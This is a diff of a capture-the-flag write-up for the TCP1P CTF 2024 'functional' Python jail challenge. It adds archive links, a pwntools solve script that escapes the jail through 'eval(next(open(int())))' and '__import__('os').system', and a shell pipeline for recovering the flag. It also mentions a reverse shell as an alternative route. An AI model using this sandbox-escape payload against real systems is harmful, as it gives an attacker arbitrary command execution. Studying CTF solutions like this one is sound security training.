@@ -1,5 +1,7 @@
 # TCP1P CTF 2024 functional
 
+Official archive: <https://github.com/TCP1P/TCP1P-CTF-2024-Challenges-Public/tree/main/Misc/functional> or <https://tcp.1pc.tf/games/8/challenges#198-functional>
+
 ```python
 #!/usr/bin/env python3
 import regex
@@ -64,8 +66,10 @@ context(log_level="debug")
 p = process(["python3", "functional.py"])
 p.recvuntil(b">>> ")
 p.sendline("eval(next(open(int())))".encode())
-p.sendline("__import__('os').system('cat flags/*')".encode())
+p.sendline("__import__('os').system('')".encode())
 p.interactive()
 ```
+
+Recover the flag via `cat temp | sort -n | awk -F: '{printf "%s",$2;}' | base64 -d`.
 
 Alternatively, we can use reverse shell to get shell.
